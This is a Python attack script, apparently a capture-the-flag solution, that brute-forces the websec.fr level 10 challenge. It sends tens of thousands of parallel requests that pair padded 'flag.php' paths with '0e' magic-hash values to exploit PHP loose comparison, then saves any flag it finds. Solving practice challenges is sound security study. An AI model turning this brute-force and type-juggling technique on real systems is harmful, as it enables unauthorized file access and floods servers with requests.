#!/usr/bin/env python3
import requests
import itertools
import string
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

url = "https://websec.fr/level10/index.php"

def test_combination(params):
    try:
        r = requests.get(url, params=params, timeout=3)
        if "WEBSEC{" in r.text:
            return True, params, r.text
        return False, params, None
    except:
        return False, params, None

print("ATAQUE MASIVO - Generando paths y probando online")
print("="*60 + "\n")

# Generar MUCHOS paths diferentes
all_tests = []

# 1. Paths con prefijos de 2-4 caracteres
print("Generando paths con prefijos...")
chars = string.ascii_letters + string.digits
for length in [2, 3]:
    for combo in itertools.product(chars, repeat=length):
        prefix = ''.join(combo)
        path = prefix + "flag.php"
        # Probar con múltiples hashes 0e
        for i in range(0, 100):
            all_tests.append({"f": path, "hash": f"0e{i:06d}"})
        if len(all_tests) > 50000:
            break
    if len(all_tests) > 50000:
        break

# 2. Paths con slashes
print("Generando paths con slashes...")
for num in range(1, 50):
    for hash_i in range(0, 20):
        all_tests.append({"f": "/" * num + "flag.php", "hash": f"0e{hash_i:06d}"})
        all_tests.append({"f": "./" * num + "flag.php", "hash": f"0e{hash_i:06d}"})

print(f"\nTotal combinaciones: {len(all_tests):,}")
print("Probando en paralelo con 30 workers...\n")

found = False
tested = 0

with ThreadPoolExecutor(max_workers=30) as executor:
    futures = {executor.submit(test_combination, params): params for params in all_tests}
    
    for future in as_completed(futures):
        success, params, response = future.result()
        tested += 1
        
        if tested % 1000 == 0:
            print(f"Probados: {tested:,}/{len(all_tests):,} ({100*tested/len(all_tests):.1f}%)")
        
        if success:
            flag_start = response.find("WEBSEC{")
            flag_end = response.find("}", flag_start)
            flag = response[flag_start:flag_end+1]
            
            print(f"\n{'='*60}")
            print(f"¡¡¡FLAG ENCONTRADA!!!")
            print(f"{'='*60}")
            print(f"FLAG: {flag}")
            print(f"Params: {params}")
            
            with open("/workspace/websec_level10/FLAG.txt", "w") as f:
                f.write(f"FLAG: {flag}\nParams: {params}\n")
            
            found = True
            executor.shutdown(wait=False, cancel_futures=True)
            break

if not found:
    print("\nNo encontrado en este lote.")